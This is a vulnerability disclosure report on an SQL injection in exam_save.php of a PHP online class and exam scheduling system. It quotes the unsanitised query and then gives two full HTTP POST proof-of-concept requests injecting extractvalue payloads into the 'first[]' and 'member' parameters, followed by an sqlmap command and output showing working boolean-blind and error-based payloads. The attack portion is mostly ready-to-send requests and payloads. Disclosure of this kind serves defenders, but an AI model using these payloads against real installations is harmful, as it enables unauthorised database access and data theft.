# Online Class and Exam Scheduling System has SQL injection vulnerability

# supplier  

https://code-projects.org/online-class-and-exam-scheduling-system-in-php-with-source-code/

# Vulnerability file

exam_save.php

Prerequisite: You need to log in first

# describe

in exam_save.php

~~~
		$query_member=mysqli_query($con,"select *,COUNT(*) as count from exam_sched 
		natural join member natural join time where member_id='$member' and exam_sched.time_id='$daym' and day='first' and settings_id='$sid' and term='$term'")or die(mysqli_error($con));
			$row=mysqli_fetch_array($query_member);
~~~

We can control the parameters of `member` and `first[]`, and there are no protective measures in the following SQL statements, so directly splicing SQL statements can cause SQL injection

# POC

~~~
POST /scheduling/pages/exam_save.php HTTP/1.1
Host: 192.168.11.1
Content-Length: 135
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Origin: http://192.168.11.1
Referer: http://192.168.11.1/scheduling/pages/exam.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cb0bm45iq5eo1j1c4n6in1cg7t
Connection: keep-alive
X-Forwarded-For: 222.65.94.31

first%5B%5D=41'and/**/extractvalue(1,concat(char(126),database()))and'&member=27&subject=ALG&cys=BEED+1A&room=101&remarks=&cys1=BEED+1A
~~~

~~~
POST /scheduling/pages/exam_save.php HTTP/1.1
Host: 192.168.11.1
Content-Length: 135
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Origin: http://192.168.11.1
Referer: http://192.168.11.1/scheduling/pages/exam.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cb0bm45iq5eo1j1c4n6in1cg7t
Connection: keep-alive
X-Forwarded-For: 222.65.94.31

first%5B%5D=41&member=27'and/**/extractvalue(1,concat(char(126),database()))and'&subject=ALG&cys=BEED+1A&room=101&remarks=&cys1=BEED+1A
~~~

# EXP

~~~
sqlmap -r sql --risk=3 
~~~

~~~
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: first[]=41&member=27' RLIKE (SELECT (CASE WHEN (4913=4913) THEN 27 ELSE 0x28 END))-- jvZu&subject=ALG&cys=BEED 1A&room=101&remarks=&cys1=BEED 1A

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: first[]=41&member=27' AND EXTRACTVALUE(5701,CONCAT(0x5c,0x7176707171,(SELECT (ELT(5701=5701,1))),0x7170626271))-- nbrO&subject=ALG&cys=BEED 1A&room=101&remarks=&cys1=BEED 1A
---
~~~

